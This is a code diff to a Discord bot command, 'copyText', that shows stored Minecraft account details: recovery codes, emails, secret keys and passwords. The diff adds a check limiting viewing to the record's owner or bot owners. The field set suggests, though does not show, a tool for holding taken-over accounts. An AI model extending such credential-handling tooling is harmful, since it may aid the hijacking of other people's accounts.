@@ -1,6 +1,8 @@
 const { queryParams } = require("../../../db/database");
 const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
 
+const isOwner = require("../../../db/isOwner");
+
 module.exports = {
     name: "copyText",
     callback: async (client, interaction) => {
@@ -15,7 +17,28 @@ module.exports = {
                 });
             }
 
-            let [, newName, mc, capes, recoveryCode, email, secEmail, secretkey, password] = results[0].action.split("|");
+            const parts = results[0].action.split("|");
+            let ownerId, newName, mc, capes, recoveryCode, email, secEmail, secretkey, password;
+
+            if (parts.length >= 10) {
+                [, ownerId, newName, mc, capes, recoveryCode, email, secEmail, secretkey, password] = parts;
+                const isUserOwner = await isOwner(interaction.user.id);
+                if (ownerId && interaction.user.id !== ownerId && !isUserOwner) {
+                    return interaction.reply({
+                        content: "You are not authorized to view these credentials.",
+                        ephemeral: true,
+                    });
+                }
+            } else {
+                [, newName, mc, capes, recoveryCode, email, secEmail, secretkey, password] = parts;
+                const isUserOwner = await isOwner(interaction.user.id);
+                if (!isUserOwner) {
+                    return interaction.reply({
+                        content: "You are not authorized to view these credentials.",
+                        ephemeral: true,
+                    });
+                }
+            }
           //  console.log(password)
             // Reply with account details and a download button
             const row = new ActionRowBuilder().addComponents(
